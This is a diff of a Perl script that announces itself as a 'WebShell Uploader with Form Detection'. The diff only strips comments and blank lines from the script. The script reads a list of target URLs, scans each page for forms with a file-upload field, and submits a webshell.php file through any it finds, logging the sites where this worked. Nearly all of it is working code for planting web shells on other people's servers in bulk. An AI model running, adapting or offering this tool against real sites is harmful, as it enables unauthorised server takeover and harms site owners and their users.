@@ -6,12 +6,10 @@ use HTTP::Request::Common qw(POST);
 use HTML::Form;
 use Getopt::Long;
 
-# Default values
 my $webshell_file = 'webshell.php';
 my $targets_file = 'targets.txt';
 my $log_file = 'success.txt';
 
-# Get command-line arguments
 GetOptions(
     'webshell=s' => \$webshell_file,
     'targets=s'  => \$targets_file,
@@ -20,17 +18,14 @@ GetOptions(
 
 print "WebShell Uploader with Form Detection, By Sheikh Nightshade\n";
 
-# Function to find upload forms on the target page
 sub find_upload_form {
     my ($url) = @_;
 
     my $ua = LWP::UserAgent->new;
-
     my $response = $ua->get($url);
 
     if ($response->is_success) {
         my @forms = HTML::Form->parse($response);
-
         foreach my $form (@forms) {
             if ($form->find_input(undef, 'file')) {
                 print "Found upload form at $url\n";
@@ -40,16 +35,13 @@ sub find_upload_form {
     } else {
         print "Failed to access $url: ", $response->status_line, "\n";
     }
-
     return undef;
 }
 
-# Function to upload webshell to the found form
 sub upload_webshell {
     my ($url, $form) = @_;
 
     $form->find_input(undef, 'file')->value($webshell_file);
-
     my $ua = LWP::UserAgent->new;
     my $response = $ua->request($form->click);
 
@@ -65,7 +57,6 @@ sub upload_webshell {
     }
 }
 
-# Main function
 sub main {
     open my $fh, '<', $targets_file or die "Could not open '$targets_file': $!";
 
@@ -74,7 +65,6 @@ sub main {
         next if $url eq '';
 
         print "Checking $url for upload forms...\n";
-
         my $form = find_upload_form($url);
 
         if ($form) {
@@ -83,7 +73,6 @@ sub main {
             print "No upload form found at $url\n";
         }
     }
-
     close $fh;
 }
 
